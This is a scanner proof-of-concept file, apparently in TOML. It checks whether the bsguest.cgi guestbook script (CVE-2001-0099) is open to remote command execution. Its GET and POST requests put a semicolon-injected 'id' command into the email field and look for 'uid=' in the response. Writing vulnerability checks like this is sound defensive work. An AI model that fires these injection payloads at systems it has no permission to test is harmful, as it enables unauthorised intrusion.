[info]
author = "AVE"
description = "检测 bsguest.cgi 留言簿脚本是否对 email 字段中的 shell 元字符（分号）进行过滤。通过向脚本提交包含命令注入的恶意邮件地址，验证是否存在远程命令执行漏洞。"
id = "POC-AVE-2001-0042"
name = "CVE-2001-0099 PoC"
severity = "critical"
tags = ["cve-2001-0099"]
vuln_id = [
    "CVE-2001-0099",
    "AVE-2001-0042",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/bsguest.cgi?name=test&email=hacker@example.com%3Bid&comment=test"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/bsguest.cgi"
protocol = "http"

[poc.requests.body]
content = "name=test&email=hacker@example.com%3Bid&comment=test"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
